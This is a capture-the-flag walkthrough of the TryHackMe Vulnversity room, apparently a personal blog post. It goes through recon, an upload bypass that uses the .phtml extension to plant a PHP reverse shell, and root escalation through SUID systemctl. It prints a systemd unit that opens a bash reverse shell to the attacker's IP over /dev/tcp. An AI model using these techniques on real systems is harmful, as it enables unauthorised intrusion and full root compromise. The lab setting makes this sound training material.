# Vulnversity Room - CTF

This weekend I completed the Vulnversity room. 
This room was an introductory room that gave guidance on where to look and stepped through the point of getting a reverse shell operating.
From there, the priviledge escalation was left up to me to work out. 

The target was a webserver, the exploitation based was based on PHP. The web server had a PHP upload portal where I was able to upload a reverse PHP shell, then through this shell escalate my privilages to root using a misconfigured permission on the systemctl program within the Ubuntu server.

Notes: 
 - I have not included the basic setup steps for TryHackMe. 
 - Initially I started usinmg the provide 'AttackBox' from TryHackMe, but part way I ended up using my open Kali linux box connected via the VPN so my IP address and the target IP address IPs changed a few times throughout my process description below.

Here is how it went:

## Step 1: Reconnaissance

### Basic reconnaissance was performed using NMAP. 

The open ports discovered with NMAP:

Then I looked at the versions of the services with these open ports using the -sV flag with NMAP

We can see Apache running on port 3333, this will be our attack vector. 

### GoBuster to discover interesting folders on the web server

From here we use GoBuster to look for interesting directories on the web server. I  used a brute force method with different word lists.
After trying with a few word I found some interesting folders.

From here we discovered the 'internal' folder, browsing to this showed us an upload portal.

*Note at this point I changed over to my Kali linux box and reset the target machine, as such the IP address changed.*

Now I looked for additional interseting folders within the /internal URI using GoBuster again.
This found another folder called uploads which looks interesting, likely the directory where the upload portal drops files. 

## Step 2: Attempt to deliver a pay load and compromise the server

I used Burp to try and find out what types of file extensions can be uploaded, hoping for a PHP based file. 
Using Burp's sniper attack allowed me to try various file extensions very quickly.

This identified that .phtml files can be uploaded, see above.

### Now we deliver the payload:

I uploaded a php reverse shell as a .phtml file using the target's upload page. 
I edited the reverse shell script variables so it points back to my Kali linuxâ€™s IP and port. 
The reverse shell was from here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 

Then I setup a netcat listener with this command: `nc -lvnp 1234`
This will listen for an incoming connection on port 1234. 
*Note the php reverse shell must be set with this port and my IP address so it can make a connection.*

Then I went to the url http://10.10.151.175:3333/internal/uploads/php-reverse-shell.phtml to run the script I just uploaded. 

Seconds later I received a connection on my netcat listener!
We can see below the reverse shell has made a connection back to my kali box.

And now I have shell access! 

Searching around on this server, I found the first flag in the user's home folder in a file called 'user.txt'.

## Step 3: Privilege Escalation

Now we want to attemp to get root access. I will look for files with the SUID bit set, maybe one of them can be exploited.

I used the command `find . -perm /4000` to files with the SUID permissions set. 
This showed that `systemctl` had the sticky-bit set, which is not normal. Since a normal user can stop, start and even create services.

At this point my plan is to create a service that launches a shell which I can access with the systemctl command. 
Now researching how to do this...

I found this article which discusses making a reverse bash shell service to exploit systemctl.
https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49 


I created a file called root.service file as below, which will be my service file:
```
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.4.37.95/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

I named the file with a phtml extension and uploaded it through the site (this was quicker than using the nc terminal to create the service file).

Then I renamed the uploaded file from my active shell on the webserver to root.service. 
I ran the following command to create the appropriate symlinks and allow the system to run the service: 
`systemctl enable /var/www/html/internal/uploads/root.service`

Now we have created a new service which should launch a reverse shell back to my kali box.

At this point I opened another netcat listener on port 9999 (as per the root.service) on my Kali box. 
After this I started the service on the webserver shell with the command `systemctl start root.service`

Presto! The service connected back to my Kali machine with the reverse shell as root. See below...

The flag was found in the folder /root/
